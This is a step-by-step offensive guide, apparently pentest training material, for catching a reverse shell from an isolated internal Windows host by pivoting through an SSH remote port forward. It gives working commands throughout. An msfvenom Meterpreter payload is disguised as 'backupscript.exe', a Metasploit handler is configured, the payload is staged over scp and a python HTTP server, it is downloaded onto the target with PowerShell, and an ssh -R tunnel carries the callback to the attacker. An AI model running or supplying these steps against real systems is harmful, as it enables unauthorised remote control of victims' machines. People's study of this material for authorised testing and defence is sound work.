This guide covers the methodology and step-by-step process for performing remote port forwarding using SSH to catch a reverse shell from an isolated internal host that cannot communicate directly with your attack machine.
### Methodology Overview
When an isolated target (e.g., a Windows machine on a private subnet) cannot route traffic back to your attack host, a direct reverse shell listener will fail. However, if a dual-homed pivot host (e.g., an Ubuntu server) can reach both networks, you can use SSH remote port forwarding (`-R`) to force the pivot host to listen for incoming connections on the internal network and tunnel them back to your attack box's local listener.

### Step-by-Step Process

#### Step 1: Generate the Reverse Payload
Create a custom payload using `msfvenom`, pointing the `LHOST` to the internal IP address of the pivot host and setting the appropriate `LPORT`.
Bash
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

#### Step 2: Configure and Start the Handler on the Attack Host
Set up your Metasploit listener (or alternative handler) on the attack machine to listen for incoming connections.
Bash
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

#### Step 3: Transfer and Host the Payload on the Pivot Host
1. Copy the payload executable to the compromised pivot host via `scp`:
    Bash
    ```
    scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
    ```
2. Start a temporary HTTP server on the pivot host to serve the payload to the internal target:
    Bash
    ```
    python3 -m http.server 8123
    ```

#### Step 4: Download the Payload on the Target Host

From the isolated internal target (e.g., via an RDP session or alternative execution method), download the payload from the pivot host:
PowerShell
```
Invoke-WebRequest -Uri "http://<InternalIPofPivotHost>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

#### Step 5: Establish Remote Port Forwarding via SSH

From your attack host, execute the SSH command with the `-R` flag to instruct the pivot host to listen on its internal interface port and forward traffic to your local listener.=
Bash
```
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
- **`-R <InternalIPofPivotHost>:8080:0.0.0.0:8000`**: Tells the pivot host to listen on port `8080` for connections from the internal network and relay them back to port `8000` on your attack host.
- **`-vN`**: Enables verbose mode for debugging and suppresses the remote shell login prompt.
#### Step 6: Execute the Payload and Catch the Session

Execute `backupscript.exe` on the internal target host. The callback will hit the pivot host's port `8080`, tunnel securely through the SSH session, and land on your local Metasploit listener (`0.0.0.0:8000`), establishing your interactive Meterpreter session.